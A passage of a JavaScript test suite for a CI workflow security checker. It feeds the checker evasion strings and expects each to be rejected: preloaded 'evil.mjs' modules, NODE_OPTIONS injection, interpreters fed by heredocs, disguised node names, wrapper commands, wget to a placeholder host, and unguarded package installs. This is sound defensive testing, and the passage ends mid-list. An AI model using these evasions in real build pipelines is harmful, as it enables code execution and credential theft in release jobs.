	// A step-level status function and continue-on-error are the same evasion one level down.
	for (const jobId of ["verify", "finalize-release", "publish-npm", "tap-bump"]) {
		let broken = mutate(RELEASE, (text) => appendStep(text, jobId, "      - name: Run regardless\n        if: always()\n        run: echo hi\n"));
		assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("status-check function")), jobId);
		broken = mutate(RELEASE, (text) => appendStep(text, jobId, "      - name: Never fails\n        continue-on-error: true\n        run: false\n"));
		assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("continue-on-error")), jobId);
		broken = mutate(RELEASE, (text) => text.replace(`\n  ${jobId}:\n`, `\n  ${jobId}:\n    continue-on-error: true\n`));
		assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`job '${jobId}'`) && problem.includes("continue-on-error")), jobId);
	}
	assert.deepEqual(checkWorkflows(), []);
});

test("no caller may pass secrets, an environment or an undeclared input to the standalone workflow (round 4, finding 5)", () => {
	const callerLine = "    uses: ./.github/workflows/standalone-binaries.yml\n";
	for (const [path, extra, expected] of [
		[RELEASE, "    secrets: inherit\n", "passes secrets"],
		[RELEASE, "    secrets:\n      TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}\n", "passes secrets"],
		[RELEASE, "    secrets:\n      TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "passes secrets"],
		[RELEASE, "    secrets: {}\n", "passes secrets"],
		[RELEASE, "    environment: release-r2\n", "in an environment"],
		[CI, "    secrets: inherit\n", "passes secrets"],
		[CI, "    with:\n      build_ref: ${{ github.sha }}\n      extra: x\n", "passes input 'extra'"],
	]) {
		const broken = mutate(path, (text) => text.replace(callerLine, `${callerLine}${extra}`));
		const problems = checkWorkflows(reader({ [path]: broken }));
		assert.ok(problems.some((problem) => problem.startsWith(`${path}: job 'standalone'`) && problem.includes(expected)), `${path} + ${JSON.stringify(extra)}:\n${problems.join("\n")}`);
	}
});

const HEREDOC_EVASIONS = [
	["python3 - from a heredoc", "python3 - <<'PY'\nprint(1)\nPY", /python3 reads its script from a heredoc/],
	["python3 from an unquoted heredoc", "python3 <<PY\nprint(1)\nPY", /python3 reads its script from a heredoc/],
	["node - from a heredoc", "node - <<'JS'\nconsole.log(1)\nJS", /node reads its script from a heredoc/],
	["node from a heredoc", "node <<'JS'\nconsole.log(1)\nJS", /node reads its script from a heredoc/],
	["node from a <<- heredoc", "node <<-JS\n\tconsole.log(1)\n\tJS", /node reads its script from a heredoc/],
	["perl from a heredoc", "perl <<'PL'\nprint 1\nPL", /perl reads its script from a heredoc/],
	["node from a here-string", "node <<<'console.log(1)'", /node reads its script from a here-string/],
	["node from stdin", "node -", /node reads its script from stdin/],
	["python3 from stdin", "python3 - x", /python3 reads its script from stdin/],
	["a heredoc body that names repository code, fed to cat", "cat <<'EOF' > /tmp/x\nnode scripts/release.mjs\nEOF", /references the checkout: scripts\/release\.mjs/],
	["a heredoc body that names repository code, fed to tee", "tee /tmp/x <<EOF\nbash .github/scripts/x.sh\nEOF", /references the checkout: \.github\/scripts\/x\.sh/],
	// The pre-existing evasion: a here-string looked like a heredoc opener and swallowed the rest of the script.
	["a here-string followed by repository code", 'jq -r .ref <<<"$ref"\nnode scripts/release.mjs', /references the checkout: scripts\/release\.mjs/],
	["a quoted here-string followed by repository code", "jq -r .ref <<<'EOF'\nnode scripts/release.mjs", /references the checkout: scripts\/release\.mjs/],
	["a here-string on a numbered fd followed by repository code", 'cat 3<<<"x"\nnode scripts/release.mjs', /references the checkout: scripts\/release\.mjs/],
];

test("every heredoc body is inspected and no interpreter may read one (round 4, finding 6)", () => {
	for (const [label, script, pattern] of HEREDOC_EVASIONS) {
		const reasons = credentialStepReasons(script, { artifactDirectories: ["artifacts"] });
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The here-string no longer opens a heredoc: the following commands are parsed as commands.
	assert.deepEqual([...shellCommands('jq -r .ref <<<"$ref"\necho after')].map((command) => command.words.map((word) => word.text)), [["jq", "-r", ".ref"], ["echo", "after"]]);
	// Two heredocs on one line are both consumed, in order, and both bodies are inspected.
	const two = [...shellCommands("cat <<A <<B\nnode scripts/a.mjs\nA\nbash scripts/b.sh\nB\necho done")];
	assert.deepEqual(two.map((command) => command.words.map((word) => word.text)), [["cat"], ["node", "scripts/a.mjs"], ["bash", "scripts/b.sh"], ["echo", "done"]]);
	// A heredoc fed to something harmless with a harmless body is fine.
	assert.deepEqual(credentialStepReasons("cat <<'EOF' > /tmp/notes.md\nRelease notes\nEOF\necho ok"), []);
});

const INTERPRETER_EVASIONS = [
	["node --import=", "node --import=./evil.mjs -e 1", /node carries an option the checker does not allow.*--import=\.\/evil\.mjs/],
	["node --import", "node --import ./evil.mjs -e 1", /node carries an option the checker does not allow.*--import/],
	["node --require", "node --require ./evil.js -e 1", /node carries an option the checker does not allow.*--require/],
	["node -r", "node -r ./evil.js -e 1", /node carries an option the checker does not allow.*-r/],
	["node --loader", "node --loader ./evil.mjs -e 1", /node carries an option the checker does not allow.*--loader/],
	["node --experimental-loader", "node --experimental-loader=./evil.mjs -e 1", /node carries an option the checker does not allow.*--experimental-loader/],
	["node --env-file", "node --env-file=.env -e 1", /node carries an option the checker does not allow.*--env-file/],
	["node --run", "node --run build", /node carries an option the checker does not allow.*--run/],
	["node --test", "node --test", /node carries an option the checker does not allow.*--test/],
	["NODE_OPTIONS as a prefix", "NODE_OPTIONS=--import=./evil.mjs node -e 1", /sets NODE_OPTIONS, which loads code before the command runs/],
	["NODE_OPTIONS through env", "env NODE_OPTIONS=--import=./evil.mjs node -e 1", /sets NODE_OPTIONS, which loads code before the command runs/],
	["NODE_OPTIONS exported", "export NODE_OPTIONS=--import=./evil.mjs", /sets NODE_OPTIONS, which loads code before the command runs/],
	["NODE_OPTIONS declared", "declare -x NODE_OPTIONS=--require=./evil.js", /sets NODE_OPTIONS/],
	["NODE_OPTIONS read", "read -r NODE_OPTIONS < /tmp/x", /sets NODE_OPTIONS/],
	["NODE_OPTIONS through sudo env", "sudo env NODE_OPTIONS=--import=./evil.mjs node -e 1", /sets NODE_OPTIONS/],
	["PYTHONSTARTUP", "PYTHONSTARTUP=./evil.py python3 -c 1", /sets PYTHONSTARTUP/],
	["PERL5OPT", "PERL5OPT=-M./evil perl -e 1", /sets PERL5OPT/],
	["python3 -m", "python3 -m scripts.evil", /python3 carries an option the checker does not allow.*-m/],
	["python3 -m http.server", "python3 -m http.server 8080", /python3 carries an option the checker does not allow/],
	["python3 -I", "python3 -I -c 1", /python3 carries an option the checker does not allow/],
	["perl -M", "perl -Mscripts::evil -e 1", /perl carries an option the checker does not allow/],
	["ruby -r", "ruby -r./evil -e 1", /ruby carries an option the checker does not allow/],
	["node -e from an expansion", 'node -e "$CODE"', /node -e runs code from an expansion/],
	["python3 -c from an expansion", 'python3 -c "$(cat x)"', /python3 -c runs code from an expansion/],
	["node -e with nothing", "node -e", /node -e names no inline code/],
	["an option built from an expansion", 'node "--$FLAG" -e 1', /node carries an option built from an expansion/],
	["an argument built from an expansion", 'node "$FLAG" x', /runs a file through node: \$FLAG/],
	["node -- file", "node -- evil.js", /runs a file through node: evil\.js/],
	["bash --rcfile", "bash --rcfile ./evil -i", /bash --rcfile runs inline or piped shell code/],
	["bash -i", "bash -i", /bash -i runs inline or piped shell code/],
	["sh -", "sh -", /sh reads its script from stdin/],
	["deno run", "deno run evil.ts", /runs a file through deno: run/],
];

test("interpreters may carry only the inline-code flag; preload and module options are refused before the flag skip (round 4, finding 7)", () => {
	const flagged = (line) => [...shellCommands(line)].flatMap((command) => repositoryCodeReasons(command));
	for (const [label, script, pattern] of INTERPRETER_EVASIONS) {
		const reasons = flagged(script);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	for (const fine of ["node -e 'console.log(1)'", "node --eval 'console.log(1)'", "node -p '1 + 1'", "node --version", "node -v", "python3 -c 'print(1)'", "python3 --version", "perl -e 'print 1'", "ruby -e 'puts 1'", "bash --version"]) {
		assert.deepEqual(flagged(fine), [], fine);
	}
});

for (const jobId of ["publish-r2", "finalize-release", "publish-npm", "tap-bump"]) {
	test(`heredoc and interpreter-option evasions inside credential-bearing job ${jobId} are rejected in the workflow (round 4, findings 6 and 7)`, () => {
		for (const [label, script, pattern] of [...HEREDOC_EVASIONS, ...INTERPRETER_EVASIONS]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in code", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	});
}

test("--ignore-scripts counts only when it is enabled (round 4, finding 8)", () => {
	for (const args of [["--ignore-scripts"], ["--ignore-scripts", "true"], ["--ignore-scripts=true"], ["--foo", "--ignore-scripts", "bar"], ["--ignore-scripts", "--other"]]) {
		assert.equal(ignoreScriptsEnabled(args), true, args.join(" "));
	}
	for (const args of [[], ["--ignore-scripts", "false"], ["--ignore-scripts=false"], ["--ignore-scripts=0"], ["--ignore-scripts=no"], ["--ignore-scripts", "0"], ["--no-ignore-scripts"], ["--ignore-scripts", "--ignore-scripts=false"], ["--ignore-scripts=false", "--ignore-scripts"], ["--ignore-script"], ["--ignore-scripts-not"]]) {
		assert.equal(ignoreScriptsEnabled(args), false, args.join(" "));
	}
	for (const disabled of ["npm ci --ignore-scripts false", "npm ci --ignore-scripts=false", "npm ci --no-ignore-scripts", "npm ci --ignore-scripts=0", "npm ci --ignore-scripts --ignore-scripts=false"]) {
		const broken = mutate(STANDALONE, (text) => text.replace("run: npm ci --ignore-scripts\n", `run: ${disabled}\n`));
		const problems = checkWorkflows(reader({ [STANDALONE]: broken }));
		assert.ok(problems.some((problem) => problem.includes("--ignore-scripts") && problem.includes(disabled)), `${disabled}:\n${problems.join("\n")}`);
	}
	// npm publish in the credential-bearing publish job must keep its --ignore-scripts too.
	for (const disabled of ['npm publish "$path" --provenance --access public --ignore-scripts=false', 'npm publish "$path" --provenance --access public']) {
		const broken = mutate(RELEASE, (text) => text.replace('npm publish "$path" --provenance --access public --ignore-scripts', disabled));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes("'publish-npm'") && problem.includes("npm publish runs the package's publish lifecycle scripts")), `${disabled}:\n${problems.join("\n")}`);
	}
});

const LIFECYCLE_EVASIONS = [
	["npm install", "npm install", /npm install runs dependency lifecycle scripts without --ignore-scripts/],
	["npm i", "npm i", /npm i runs dependency lifecycle scripts/],
	["npm install --global", "npm install --global npm@12", /npm install runs dependency lifecycle scripts/],
	["npm install with a disabled flag", "npm install --ignore-scripts=false", /npm install runs dependency lifecycle scripts/],
	["npm ci", "npm ci", /npm ci runs dependency lifecycle scripts/],
	["npm update", "npm update", /npm update runs dependency lifecycle scripts/],
	["npm link", "npm link", /npm link runs dependency lifecycle scripts/],
	["npm exec", "npm exec -- prime-agent", /npm exec runs dependency lifecycle scripts/],
	["npm x", "npm x tsx x.ts", /npm x runs dependency lifecycle scripts/],
	["npm prune", "npm prune --production", /npm prune runs dependency lifecycle scripts/],
	["npm dedupe", "npm dedupe", /npm dedupe runs dependency lifecycle scripts/],
	["npm audit fix", "npm audit fix", /npm audit runs dependency lifecycle scripts/],
	["npm rebuild (all)", "npm rebuild", /npm rebuild runs install scripts; only the literal 'npm rebuild esbuild' is allowed/],
	["npm rebuild another package", "npm rebuild koffi", /only the literal 'npm rebuild esbuild'/],
	["npm rebuild two packages", "npm rebuild esbuild koffi", /only the literal 'npm rebuild esbuild'/],
	["npm rebuild esbuild with a flag", "npm rebuild esbuild --foreground-scripts", /only the literal 'npm rebuild esbuild'/],
	["npm rebuild esbuild --ignore-scripts (pointless)", "npm rebuild esbuild --ignore-scripts", /only the literal 'npm rebuild esbuild'/],
	["npm rb", "npm rb esbuild", /only the literal 'npm rebuild esbuild'/],
	["npm with config before the subcommand", "npm --prefix x install", /npm carries options before its subcommand/],
	["npm with config that hides the subcommand", "npm --prefix foo install", /npm carries options before its subcommand/],
	["yarn v1 install through a flag alone", "yarn --frozen-lockfile", /yarn carries options before its subcommand/],
	["npx", "npx tsx x.ts", /npx may install and run a package's lifecycle scripts/],
	["npx --yes", "npx --yes some-package", /npx may install/],
	["npx with a disabled flag", "npx --ignore-scripts=false tsx x.ts", /npx may install/],
	["bunx", "bunx tsx x.ts", /bunx installs and runs code from a registry/],
	["yarn", "yarn", /yarn {2}runs dependency lifecycle scripts|yarn runs dependency lifecycle scripts/],
	["yarn install", "yarn install --frozen-lockfile", /yarn install runs dependency lifecycle scripts/],
	["yarn add", "yarn add x", /yarn add runs dependency lifecycle scripts/],
	["yarn dlx", "yarn dlx tsx", /yarn dlx runs dependency lifecycle scripts/],
	["pnpm install", "pnpm install", /pnpm install runs dependency lifecycle scripts/],
	["pnpm i", "pnpm i --frozen-lockfile", /pnpm i runs dependency lifecycle scripts/],
	["pnpm dlx", "pnpm dlx tsx", /pnpm dlx runs dependency lifecycle scripts/],
	["bun install", "bun install", /bun install runs dependency lifecycle scripts/],
	["bun add", "bun add x", /bun add runs dependency lifecycle scripts/],
	["bun x", "bun x tsx", /bun x runs dependency lifecycle scripts/],
	["pip install", "pip install requests", /pip installs and runs code from a registry/],
	["pip3 install", "pip3 install requests", /pip3 installs and runs code from a registry/],
	["uvx", "uvx ruff", /uvx installs and runs code from a registry/],
	["uv pip install", "uv pip install requests", /uv pip runs dependency lifecycle scripts/],
	["uv sync", "uv sync", /uv sync runs dependency lifecycle scripts/],
	["uv run", "uv run x.py", /uv run runs dependency lifecycle scripts/],
	["npm through a path", "/usr/local/bin/npm ci --ignore-scripts", /invokes npm through a path or expansion/],
	["a subcommand from an expansion", 'npm "$SUB"', /npm runs a subcommand built from an expansion/],
	["inside a command substitution", "out=$(npm install)", /inside a command substitution: npm install runs dependency lifecycle scripts/],
	["after a continuation", "npm \\\n  install", /npm install runs dependency lifecycle scripts/],
	["with an assignment prefix", "CI=1 npm install", /npm install runs dependency lifecycle scripts/],
];

test("every lifecycle-running package-manager command is refused on a build runner unless --ignore-scripts is enabled (round 4, finding 9)", () => {
	const build = { workflow: RELEASE, jobId: "build" };
	for (const [label, script, pattern] of LIFECYCLE_EVASIONS) {
		const reasons = [...shellCommands(script)].flatMap((command) => lifecycleReasons(command, build));
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The literal rebuild is allowed in the allowlisted jobs only.
	assert.deepEqual(REBUILD_ALLOWLIST.command, ["npm", "rebuild", "esbuild"]);
	assert.deepEqual(Object.keys(REBUILD_ALLOWLIST.jobs), [RELEASE, STANDALONE]);
	for (const [workflow, jobs] of Object.entries(REBUILD_ALLOWLIST.jobs)) {
		for (const jobId of jobs) assert.deepEqual([...shellCommands("npm rebuild esbuild")].flatMap((command) => lifecycleReasons(command, { workflow, jobId })), [], `${workflow} ${jobId}`);
	}
	for (const location of [{ workflow: RELEASE, jobId: "assemble" }, { workflow: RELEASE, jobId: "publish-npm" }, { workflow: STANDALONE, jobId: "other" }, {}]) {
		assert.match([...shellCommands("npm rebuild esbuild")].flatMap((command) => lifecycleReasons(command, location)).join("\n"), /only the literal 'npm rebuild esbuild' is allowed, and only in/);
	}
	// What the checked-in build jobs do is accepted, one construct at a time.
	for (const fine of [
		"npm ci --ignore-scripts",
		"npm install --global --ignore-scripts npm@12.0.2",
		"npm install --ignore-scripts=true",
		"npx --ignore-scripts tsx ../../node_modules/vitest/dist/cli.js --run test/x.test.ts",
		"pnpm install --ignore-scripts",
		"bun install --ignore-scripts",
		"yarn install --ignore-scripts",
		"npm run build",
		"npm run release:pack -- --channel stable",
		"npm --version",
		"npm view prime-agent version",
		"npm publish x.tgz --provenance --access public --ignore-scripts",
		"corepack enable",
		"uv --version",
		"echo npm install",
	]) {
		assert.deepEqual([...shellCommands(fine)].flatMap((command) => lifecycleReasons(command, build)), [], fine);
	}
	// ...and the workflow-level check reaches every job of both build workflows.
	for (const [path, jobId] of [[RELEASE, "build"], [RELEASE, "assemble"], [RELEASE, "validate-macos"], [RELEASE, "pack-npm"], [RELEASE, "publish-npm"], [STANDALONE, "build"]]) {
		for (const [label, script, pattern] of LIFECYCLE_EVASIONS) {
			const broken = mutate(path, (text) => appendStep(text, jobId, runStep("Sneak in an install", script)));
			const problems = checkWorkflows(reader({ [path]: broken }));
			assert.ok(problems.some((problem) => problem.startsWith(`${path}: job '${jobId}'`) && pattern.test(problem)), `${label} in ${path} ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	}
	// `npm rebuild esbuild` outside the allowlisted jobs is rejected in the workflow as well.
	const broken = mutate(RELEASE, (text) => appendStep(text, "assemble", runStep("Rebuild here", "npm rebuild esbuild")));
	assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes("'assemble'") && problem.includes("only the literal 'npm rebuild esbuild'")));
	// The checked-in workflows carry no unflagged install anywhere.
	for (const path of [RELEASE, STANDALONE]) {
		const workflow = parse(readFileSync(path, "utf8"));
		for (const [jobId, job] of Object.entries(workflow.jobs)) {
			for (const step of job.steps ?? []) {
				for (const command of shellCommands(String(step.run ?? ""))) assert.deepEqual(lifecycleReasons(command, { workflow: path, jobId }), [], `${path} ${jobId} ${step.name}`);
			}
		}
	}
});

const HEAD_OBJECT_STEP = `set -euo pipefail
for file in artifacts/*; do
  name=$(basename "$file")
  key="releases/v\${PRODUCTION_VERSION}/\${name}"
  ${HEAD_OBJECT_GUARD.reset}
  aws s3api head-object --bucket "$R2_BUCKET" --key "$key" \\
    --endpoint-url "$R2_ENDPOINT_URL" >/tmp/head.json 2>${HEAD_OBJECT_GUARD.errorFile} || ${HEAD_OBJECT_GUARD.capture}
  ${HEAD_OBJECT_GUARD.exists}
    echo "unchanged \${key}"
    continue
  ${HEAD_OBJECT_GUARD.absent}
    echo "absent \${key}"
  else
    echo "head-object failed" >&2
    cat /tmp/head.err >&2
    exit 1
  fi
  aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/\${name}" --quiet
done`;

test("aws s3api head-object may treat only an explicit 404 as absent (round 4, finding 10)", () => {
	assert.deepEqual(headObjectGuardReasons(HEAD_OBJECT_STEP), []);
	assert.deepEqual(headObjectGuardReasons("set -euo pipefail\naws s3 cp a s3://b/c"), []); // no head-object: nothing to guard
	const variants = [
		["head-object as an if condition", (text) => text.replace(`${HEAD_OBJECT_GUARD.reset}\n  aws s3api`, "if aws s3api").replace(` || ${HEAD_OBJECT_GUARD.capture}\n  ${HEAD_OBJECT_GUARD.exists}`, "; then"), /uses aws s3api head-object as a condition/],
		["a negated condition", (text) => text.replace("  aws s3api", "  ! aws s3api"), /uses aws s3api head-object as a condition/],
		["stderr discarded", (text) => text.replace(`2>${HEAD_OBJECT_GUARD.errorFile}`, "2>/dev/null"), /must keep the stderr of aws s3api head-object in \/tmp\/head\.err/],
		["stderr merged into stdout", (text) => text.replace(`2>${HEAD_OBJECT_GUARD.errorFile}`, "2>&1"), /must keep the stderr/],
		["stderr to another file", (text) => text.replace(`2>${HEAD_OBJECT_GUARD.errorFile}`, "2>/tmp/other.err"), /must keep the stderr/],
		["no stderr redirection", (text) => text.replace(` 2>${HEAD_OBJECT_GUARD.errorFile}`, ""), /must keep the stderr/],
		["no status reset", (text) => text.replace(`  ${HEAD_OBJECT_GUARD.reset}\n`, ""), /must reset 'head_status=0' immediately before/],
		["a stale status from the previous iteration", (text) => text.replace(`  ${HEAD_OBJECT_GUARD.reset}\n`, "  true\n"), /must reset 'head_status=0' immediately before/],
		["no status capture", (text) => text.replace(` || ${HEAD_OBJECT_GUARD.capture}`, " || true"), /must capture the exit status with '\|\| head_status=\$\?' immediately after/],
		["any non-zero status treated as absent", (text) => text.replace(HEAD_OBJECT_GUARD.absent, 'elif [ "$head_status" -ne 0 ]; then'), /must accept only an explicit 404 as "absent", spelled exactly/],
		["a 404 accepted without the exit code", (text) => text.replace(HEAD_OBJECT_GUARD.absent, "elif grep -q 404 /tmp/head.err; then"), /must accept only an explicit 404/],
		["a 403 accepted as absent", (text) => text.replace("(404|NotFound|NoSuchKey)", "(403|404|NotFound|NoSuchKey)"), /must accept only an explicit 404/],
		["the exists test loosened", (text) => text.replace(HEAD_OBJECT_GUARD.exists, 'if [ "$head_status" -ne 254 ]; then'), /must test the head-object status with exactly/],
		["the else branch dropped", (text) => text.replace("  else\n    echo \"head-object failed\" >&2\n    cat /tmp/head.err >&2\n    exit 1\n", ""), /must end the head-object guard with an 'else' branch that exits 1/],
		["the else branch does not exit", (text) => text.replace("    exit 1\n  fi", "    echo continuing anyway\n  fi"), /must end the head-object guard with an 'else' branch that exits 1/],
		["another elif branch", (text) => text.replace("  else\n", '  elif [ "$head_status" -eq 403 ]; then\n    echo absent\n  else\n'), /must not add another branch to the head-object guard/],
		["head_status reassigned elsewhere", (text) => text.replace("  fi\n", "  fi\n  head_status=254\n"), /assigns head_status outside the head-object guard/],
		["no set -e", (text) => text.replace("set -euo pipefail\n", "set -uo pipefail\n"), /must start with 'set -euo pipefail'/],
	];
	for (const [label, mutateText, pattern] of variants) {
		const broken = mutateText(HEAD_OBJECT_STEP);
		assert.notEqual(broken, HEAD_OBJECT_STEP, `${label}: the mutation changed nothing`);
		const reasons = headObjectGuardReasons(broken);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// Both checked-in upload loops carry the guard, and loosening either is a workflow failure.
	const release = parse(readFileSync(RELEASE, "utf8"));
	for (const [jobId, stepName] of [["publish-r2", "Upload immutable release objects"], ["publish-beta-r2", "Upload immutable beta objects"]]) {
		const step = release.jobs[jobId].steps.find((entry) => entry.name === stepName);
		assert.ok(step.run.includes(HEAD_OBJECT_GUARD.absent), `${jobId} carries the guard`);
		assert.deepEqual(headObjectGuardReasons(step.run), [], jobId);
		for (const [label, from, to, pattern] of [
			["discarding stderr", `2>${HEAD_OBJECT_GUARD.errorFile} || ${HEAD_OBJECT_GUARD.capture}`, `2>/dev/null || ${HEAD_OBJECT_GUARD.capture}`, /must keep the stderr/],
			["treating every failure as absent", HEAD_OBJECT_GUARD.absent, 'elif [ "$head_status" -ne 0 ]; then', /must accept only an explicit 404/],
			["dropping the reset", `            ${HEAD_OBJECT_GUARD.reset}\n`, "", /must reset 'head_status=0'/],
			["continuing on another error", "              cat /tmp/head.err >&2\n              exit 1\n", "              cat /tmp/head.err >&2\n", /'else' branch that exits 1/],
		]) {
			const broken = mutate(RELEASE, (text) => {
				const start = text.indexOf(`\n  ${jobId}:\n`);
				const index = text.indexOf(from, start);
				assert.ok(index > start, `${jobId} contains ${from}`);
				return `${text.slice(0, index)}${to}${text.slice(index + from.length)}`;
			});
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	}
});

test("every caller of the standalone workflow - ci.yml included - passes exactly contents:read and id-token:write and no secret (round 4, finding 11)", () => {
	const ci = parse(readFileSync(CI, "utf8"));
	assert.equal(ci.jobs.standalone.uses, `./${STANDALONE}`);
	assert.deepEqual(ci.jobs.standalone.permissions, { contents: "read", "id-token": "write" });
	assert.equal("secrets" in ci.jobs.standalone, false);
	const callerPermissions = "    permissions:\n      contents: read\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml\n";
	for (const [label, replacement, expected] of [
		["no permissions", "    uses: ./.github/workflows/standalone-binaries.yml\n", "(none declared)"],
		["contents only", "    permissions:\n      contents: read\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["id-token only", "    permissions:\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["contents write", "    permissions:\n      contents: write\n      id-token: write\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["an extra scope", "    permissions:\n      contents: read\n      id-token: write\n      packages: write\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["write-all", "    permissions: write-all\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["empty permissions", "    permissions: {}\n    uses: ./.github/workflows/standalone-binaries.yml\n", "must pass exactly"],
		["secrets inherit", `${callerPermissions}    secrets: inherit\n`, "passes secrets"],
	]) {
		for (const path of [CI, RELEASE]) {
			const broken = mutate(path, (text) => text.replace(callerPermissions, replacement));
			const problems = checkWorkflows(reader({ [path]: broken }));
			assert.ok(problems.some((problem) => problem.startsWith(`${path}: job 'standalone'`) && problem.includes(expected)), `${label} in ${path}:\n${problems.join("\n")}`);
		}
	}
	// A caller in any other workflow file is validated the same way.
	const extra = "on: push\njobs:\n  sneaky:\n    secrets: inherit\n    uses: ./.github/workflows/standalone-binaries.yml\n";
	const problems = checkWorkflows(reader({ ".github/workflows/extra.yml": extra }), () => ["build-binaries.yml", "ci.yml", "extra.yml"]);
	assert.ok(problems.some((problem) => problem.startsWith(".github/workflows/extra.yml: job 'sneaky'") && problem.includes("passes secrets")), problems.join("\n"));
	assert.ok(problems.some((problem) => problem.startsWith(".github/workflows/extra.yml: job 'sneaky'") && problem.includes("must pass exactly")), problems.join("\n"));
});

// ---------------------------------------------------------------------------------------------
// Round 5: an explicit command allowlist next to every credential, the aws endpoint pin, the
// artifact source path, and the signed beta.
// ---------------------------------------------------------------------------------------------

/** Every job that holds a credential, including the ones that hold only a write token or OIDC. */
const ALL_CREDENTIAL_JOBS = ["publish-r2", "finalize-release", "publish-beta-r2", "publish-npm", "tap-bump", "github-release", "github-release-beta", "sign"];

const INTERPRETER_EVASIONS_ROUND_5 = [
	// The reviewer's case: inline code that spells the checkout path only at run time.
	["node -e concatenating the checkout path", `node -e "require('./scr'+'ipts/x')"`, /runs node, which is not on the command allowlist/],
	["node -e", "node -e 'console.log(1)'", /runs node, which is not on the command allowlist/],
	["node --eval", "node --eval 'console.log(1)'", /runs node, which is not on the command allowlist/],
	["node -p", "node -p '1 + 1'", /runs node, which is not on the command allowlist/],
	["node --print", "node --print '1'", /runs node, which is not on the command allowlist/],
	["node --version", "node --version", /runs node, which is not on the command allowlist/],
	["nodejs", "nodejs -e 1", /runs nodejs, which is not on the command allowlist/],
	["python3 -c", "python3 -c 'print(1)'", /runs python3, which is not on the command allowlist/],
	["python -c", "python -c 'print(1)'", /runs python, which is not on the command allowlist/],
	["perl -e", "perl -e 'print 1'", /runs perl, which is not on the command allowlist/],
	["perl -E", "perl -E 'say 1'", /runs perl, which is not on the command allowlist/],
	["ruby -e", "ruby -e 'puts 1'", /runs ruby, which is not on the command allowlist/],
	["deno", "deno eval 'console.log(1)'", /runs deno, which is not on the command allowlist/],
	["bun", "bun -e '1'", /runs bun, which is not on the command allowlist/],
	["tsx", "tsx -e '1'", /runs tsx, which is not on the command allowlist/],
	["awk with system()", `awk 'BEGIN{system("id")}'`, /runs awk, which is not on the command allowlist/],
	["a concatenated interpreter name", `'no'"de" -e 1`, /runs node, which is not on the command allowlist/],
	["an ANSI-C quoted interpreter name", "$'\\x6eode' -e 1", /runs node, which is not on the command allowlist/],
	["an escaped interpreter name", "no\\de -e 1", /runs node, which is not on the command allowlist/],
	["node through env", "env node -e 1", /runs env, a wrapper/],
	["node through /usr/bin/env", "/usr/bin/env node -e 1", /runs \/usr\/bin\/env through a path/],
	["node through command", "command node -e 1", /runs command, a wrapper/],
	["node through sudo", "sudo node -e 1", /runs sudo, a wrapper/],
	["node through timeout", "timeout 5 node -e 1", /runs timeout, a wrapper/],
	["node through exec", "exec node -e 1", /runs exec, a wrapper/],
	["node through nohup", "nohup node -e 1", /runs nohup, a wrapper/],
	["node through nice", "nice -n 5 node -e 1", /runs nice, a wrapper/],
	["a path to node", "/usr/local/bin/node -e 1", /runs \/usr\/local\/bin\/node through a path/],
	["a relative path", "./node -e 1", /runs \.\/node through a path/],
	["node inside a command substitution", "x=$(node -e 1)", /inside a command substitution: runs node, which is not on the command allowlist/],
	["node inside a process substitution", "cat <(node -e 1)", /inside a command substitution: runs node/],
	["node after an assignment prefix", "FOO=1 node -e 1", /runs node, which is not on the command allowlist/],
	["node after if", "if node -e 1; then echo; fi", /runs node, which is not on the command allowlist/],
	["node after !", "! node -e 1", /runs node, which is not on the command allowlist/],
	["node in a pipeline", "echo 1 | node -e 1", /runs node, which is not on the command allowlist/],
	["node in a subshell", "(node -e 1)", /runs node, which is not on the command allowlist/],
	["node in a brace group", "{ node -e 1; }", /runs node, which is not on the command allowlist/],
	["node in a function body", "f() {\n  node -e 1\n}\nf", /runs node, which is not on the command allowlist/],
	["a command not on any list", "openssl rand -hex 8", /runs openssl, which is not on the command allowlist/],
	["make", "make publish", /runs make, which is not on the command allowlist/],
	["docker", "docker run x", /runs docker, which is not on the command allowlist/],
	["ssh", "ssh host cmd", /runs ssh, which is not on the command allowlist/],
	["wget", "wget https://example.invalid/x", /runs wget, which is not on the command allowlist/],
	["find without -exec", "find . -name x", /runs find, which is not on the command allowlist/],
	["xargs", "echo x | xargs echo", /runs xargs, which is not on the command allowlist/],
	["eval", "eval 'echo hi'", /runs eval, which is not on the command allowlist/],
	["source", "source x", /runs source, which is not on the command allowlist/],
	["trap", "trap 'echo' EXIT", /runs trap, which is not on the command allowlist/],
